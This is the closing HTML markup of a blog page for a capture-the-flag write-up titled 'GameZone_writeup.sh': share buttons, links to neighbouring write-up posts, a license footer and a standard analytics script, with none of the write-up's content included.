+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=GameZone_writeup.sh&amp;body=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f&amp;media=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f;description=GameZone_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f&amp;title=GameZone_writeup.sh&amp;summary=GameZone_writeup.sh&amp;source=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f&amp;resubmit=true&amp;title=GameZone_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f;title=GameZone_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=GameZone_writeup.sh%20https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f&amp;t=GameZone_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=GameZone_writeup.sh&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fgamezone_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://tzero86-bits.netlify.app/posts/skynet_writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Skynet_writeup.sh</span>
+              </a>
+            </span>
+          
+
+          
+            <span class="button next">
+              <a href="https://tzero86-bits.netlify.app/posts/easyctf_writeup/">
+                <span class="button__text">EasyCTF_writeup.sh</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="https://tzero86-bits.netlify.app/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+    </body>
+</html>
